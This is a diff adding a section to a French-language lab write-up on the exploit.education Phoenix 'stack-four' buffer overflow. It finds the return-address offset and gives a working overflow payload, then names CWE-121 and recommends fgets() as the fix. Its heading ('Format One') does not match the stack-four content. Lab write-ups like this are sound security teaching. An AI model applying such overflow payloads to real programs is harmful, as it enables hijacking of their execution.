@@ -172,3 +172,43 @@ sprintf(locals.dest, "%s", buffer)
 snprintf(locals.dest, 32, "%s", buffer)
 ```
 
+### 6.1 Format One
+
+#### Identify the Weakness
+
+- gets(buffer) dans start_level() lit sans limite dans un buffer de 64 octets.
+
+- L'overflow permet d'écraser le pointeur de return de la fonction.
+
+#### Try to Exploit the Weakness 
+
+```bash 
+objdump -d stack-four
+```
+ADDR_COMPLETE = 0x40061d
+
+calcul de l'offset :
+
+```bash
+python3 -c 'print("0"*64 + "A"*8 + "B"*8 + "C"*8 + "D"*8)' | ./stack-four
+# OUTPUT :
+Welcome to phoenix/stack-four, brought to you by https://exploit.education
+and will be returning to 0x4444444444444444
+Segmentation fault
+
+```
+0x44 = D
+Donc il me faut un offset de 3*8 = 24
+D'ou l acommande suivante :
+
+```bash
+python3 -c 'print("0"*88 + "\x1d\x06\x40")' | ./stack-four
+```
+
+#### Find CWE Linked to the Weakness
+
+- CWE-121: Stack-based Buffer Overflow (débordement de tampon sur la pile via gets()).
+
+#### Remediation
+
+Remplacer gets() par fgets(buffer, sizeof(buffer), stdin).
